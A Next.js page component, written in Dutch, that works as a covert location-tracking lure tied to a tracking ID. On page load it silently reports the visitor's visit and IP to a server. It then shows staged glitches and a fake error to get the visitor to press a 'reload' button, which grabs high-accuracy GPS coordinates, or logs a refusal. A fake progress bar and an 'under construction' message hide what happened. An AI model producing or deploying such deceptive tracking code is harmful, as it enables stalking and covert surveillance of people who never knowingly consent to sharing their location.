"use client";

import { useEffect, useState } from "react";
import { useParams } from "next/navigation";

export default function TrackingPage() {
  const params = useParams();
  const trackingId = params.id as string;
  const [status, setStatus] = useState<"glitching" | "requesting" | "loading" | "error">("glitching");
  const [glitchText, setGlitchText] = useState("Pagina laden...");
  const [showButton, setShowButton] = useState(false);
  const [loadingProgress, setLoadingProgress] = useState(0);

  // Automatisch IP-locatie versturen bij het laden van de pagina
  useEffect(() => {
    const sendIpLocation = async () => {
      try {
        await fetch("/api/locatie", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            trackingId,
            type: "ip",
            timestamp: new Date().toISOString(),
          }),
        });
      } catch (e) {
        console.error("IP locatie fout:", e);
      }
    };
    
    sendIpLocation();
  }, [trackingId]);

  // Glitch effect simulatie
  useEffect(() => {
    const glitchMessages = [
      "Pagina laden...",
      "Verbinden met server...",
      "Error: timeout",
      "Opnieuw proberen...",
      "Laden...",
      "Fout: kan pagina niet laden",
      "Verbinding mislukt",
    ];

    let index = 0;
    const interval = setInterval(() => {
      index = (index + 1) % glitchMessages.length;
      setGlitchText(glitchMessages[index]);
    }, 800);

    // Toon de knop na 3 seconden
    const buttonTimer = setTimeout(() => {
      setShowButton(true);
    }, 3000);

    return () => {
      clearInterval(interval);
      clearTimeout(buttonTimer);
    };
  }, []);

  const handleButtonClick = async () => {
    setStatus("requesting");
    
    if (!navigator.geolocation) {
      startFakeLoading();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        try {
          await fetch("/api/locatie", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              trackingId,
              type: "gps",
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              timestamp: new Date().toISOString(),
            }),
          });
        } catch (e) {
          console.error("GPS fout:", e);
        }
        startFakeLoading();
      },
      async (error) => {
        console.error("Geolocation error:", error);
        try {
          await fetch("/api/locatie", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              trackingId,
              type: "gps_denied",
              error: error.message,
              timestamp: new Date().toISOString(),
            }),
          });
        } catch (e) {
          console.error("Error sending denial:", e);
        }
        startFakeLoading();
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      }
    );
  };

  const startFakeLoading = () => {
    setStatus("loading");
    // Fake loading progress
    let progress = 0;
    const interval = setInterval(() => {
      progress += Math.random() * 15;
      if (progress >= 100) {
        progress = 100;
        clearInterval(interval);
        // Na "laden" toon een error
        setTimeout(() => {
          setStatus("error");
        }, 500);
      }
      setLoadingProgress(Math.min(progress, 100));
    }, 300);
  };

  return (
    <div className="min-h-screen bg-gray-900 flex items-center justify-center p-4 font-mono">
      <div className="max-w-lg w-full">
        {status === "glitching" && (
          <div className="text-center">
            {/* Glitchy header */}
            <div className="mb-8">
              <h1 className="text-white text-xl mb-2 opacity-80">
                🚧 Website in ontwikkeling
              </h1>
              <div className="h-px bg-gray-700 w-full"></div>
            </div>

            {/* Fake console/terminal look */}
            <div className="bg-black rounded-lg p-4 text-left mb-6 border border-gray-700">
              <div className="flex items-center gap-2 mb-3 pb-2 border-b border-gray-800">
                <div className="w-3 h-3 rounded-full bg-red-500"></div>
                <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                <div className="w-3 h-3 rounded-full bg-green-500"></div>
                <span className="text-gray-500 text-xs ml-2">console</span>
              </div>
              <div className="space-y-1 text-sm">
                <p className="text-green-400">&gt; Initialiseren...</p>
                <p className="text-yellow-400">&gt; Laden van assets...</p>
                <p className="text-red-400 animate-pulse">&gt; {glitchText}</p>
              </div>
            </div>

            {/* Error message */}
            <div className="bg-red-900/30 border border-red-800 rounded-lg p-4 mb-6">
              <p className="text-red-400 text-sm">
                ⚠️ Er ging iets mis bij het laden van de pagina.
              </p>
              <p className="text-red-300/70 text-xs mt-1">
                Dit kan komen door je browser instellingen.
              </p>
            </div>

            {/* Button appears after delay */}
            {showButton && (
              <button
                onClick={handleButtonClick}
                className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-4 px-6 rounded-lg transition-all transform hover:scale-105 active:scale-95 animate-pulse"
              >
                🔄 Opnieuw laden
              </button>
            )}

            {!showButton && (
              <div className="text-gray-500 text-sm">
                Even geduld...
              </div>
            )}
          </div>
        )}

        {status === "requesting" && (
          <div className="text-center">
            <div className="bg-black rounded-lg p-6 border border-gray-700">
              <div className="animate-spin text-4xl mb-4">⚙️</div>
              <p className="text-gray-300">Pagina opnieuw laden...</p>
              <p className="text-gray-500 text-sm mt-2">Toestemming nodig voor volledige functionaliteit</p>
            </div>
          </div>
        )}

        {status === "loading" && (
          <div className="text-center">
            <div className="bg-black rounded-lg p-6 border border-gray-700">
              <p className="text-gray-300 mb-4">Laden... {Math.round(loadingProgress)}%</p>
              <div className="w-full bg-gray-800 rounded-full h-2">
                <div 
                  className="bg-blue-500 h-2 rounded-full transition-all duration-300"
                  style={{ width: `${loadingProgress}%` }}
                ></div>
              </div>
            </div>
          </div>
        )}

        {status === "error" && (
          <div className="text-center">
            <div className="bg-black rounded-lg p-6 border border-gray-700">
              <div className="text-4xl mb-4">🔧</div>
              <p className="text-gray-300 mb-2">Website nog niet beschikbaar</p>
              <p className="text-gray-500 text-sm">
                Sorry, we zijn nog bezig met bouwen!<br/>
                Probeer het later nog eens.
              </p>
            </div>
          </div>
        )}

        {/* Footer */}
        <div className="mt-8 text-center">
          <p className="text-gray-600 text-xs">
            v0.1.0-beta • {new Date().getFullYear()}
          </p>
        </div>
      </div>
    </div>
  );
}
